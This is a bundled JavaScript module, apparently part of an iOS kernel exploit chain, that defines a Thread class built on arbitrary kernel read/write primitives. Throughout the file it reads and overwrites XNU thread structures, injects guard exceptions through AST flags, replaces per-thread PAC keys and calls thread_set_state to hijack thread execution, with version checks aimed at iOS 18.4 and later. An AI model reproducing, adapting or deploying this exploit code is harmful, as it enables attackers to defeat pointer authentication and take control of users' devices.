/***/
"./src/libs/TaskRop/Thread.js":
/*!************************************!*\
  !*** ./src/libs/TaskRop/Thread.js ***!
  \************************************/
/***/
((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

    __webpack_require__.r(__webpack_exports__);
    /* harmony export */
    __webpack_require__.d(__webpack_exports__, {
        /* harmony export */
        "default": () => ( /* binding */ Thread)
        /* harmony export */
    });
    /* harmony import */
    var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( /*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
    /* harmony import */
    var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( /*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
    /* harmony import */
    var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( /*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
    /* harmony import */
    var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( /*! libs/Chain/Native */ "./src/libs/Chain/Native.js");





    const AST_GUARD = 0x1000;
    const TAG = "THREAD";

    class Thread {
        static getTro(thread) {
            let tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().tro);
            // Ignore threads with invalid tro address.
            if (!(tro & 0xf000000000000000n)) {
                //console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);
                return 0n;
            }
            return tro;
        }
        static getCtid(thread) {
            let ctid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ctid);
            return ctid;
        }
        static getTask(thread) {
            let tro = this.getTro(thread);
            // Ignore threads with invalid tro address.
            if (!(tro & 0xf000000000000000n) || tro === 0n)
                return 0n;
            let task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().troTask);
            return task;
        }
        static next(thread) {
            if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].strip(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads) < 0xffffffd000000000n)
                return 0;
            let next = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads);
            if (next < 0xffffffd000000000n)
                return 0;
            return next;
        }
        static setMutex(thread, ctid) {
            libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData, ctid);
        }
        static getMutex(thread) {
            let mutex = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData);
            return mutex;
        }
        static getStack(thread) {
            let stackptr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().kstackptr);
            return stackptr;
        }
        static injectGuardException(thread, code) {
            if (!this.getTro(thread)) {
                console.log(TAG, `got invalid tro of thread, not injecting exception since thread is dead`);
                return false;
            }

            // 18.4+
            if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
                libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0x17n);
                libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, code);
            } else {
                libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, code);
            }

            let ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
            ast |= AST_GUARD;
            libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);
            return true;
        }
        static clearGuardException(thread) {
            if (!this.getTro(thread)) {
                console.log(TAG, `got invalid tro of thread, still clearing exception to avoid crash`);
            }
            let ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
            ast &= ~AST_GUARD | 0x80000000;
            libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);

            // 18.4+
            if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
                if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode) == 0x17n) {
                    libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
                    libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, 0n);
                }
            } else {
                libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
            }
        }
        static getOptions(thread) {
            let options = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options);
            return options;
        }
        static setOptions(thread, options) {
            libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options, options);
        }
        static getRopPid(thread) {
            let ropPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid);
            return ropPid;
        }
        static getJopPid(thread) {
            let jopPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid);
            return jopPid;
        }
        static setPACKeys(thread, keyA, keyB) {
            libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid, keyA);
            libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid, keyB);
        }

        static getState(machThread) {
            let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
            let stateCountPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem + 0x200n;
            libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write32(stateCountPtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
            let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_get_state",
                machThread,
                libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
                statePtr,
                stateCountPtr);
            if (kr != 0) {
                console.log(TAG, "Unable to read thread state");
                return false;
            }

            let stateBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].read(statePtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_SIZE);
            let state = new _ThreadState__WEBPACK_IMPORTED_MODULE_2__["default"](stateBuff);
            return state;
        }

        static setState(machThread, threadAddr, state) {
            let options = 0;
            if (threadAddr) {
                options = Thread.getOptions(threadAddr);
                options |= 0x8000;
                Thread.setOptions(threadAddr, options);
            }

            let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
            libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write(statePtr, state.buffer);
            //console.log(TAG,`thread:${Utils.hex(thread)}`);
            let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_set_state",
                machThread,
                libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
                statePtr,
                libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
            if (kr != 0) {
                console.log(TAG, `Failed thread_set_state with error:${kr}`);
                return false;
            }

            if (threadAddr) {
                options &= ~0x8000;
                Thread.setOptions(threadAddr, options);
            }
            return true;
        }

        static resume(machThread) {
            let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_resume", machThread);
            if (kr != 0) {
                console.log(TAG, "Unable to resume suspended thread");
                return false;
            }
            return true;
        }
    }


    /***/
}),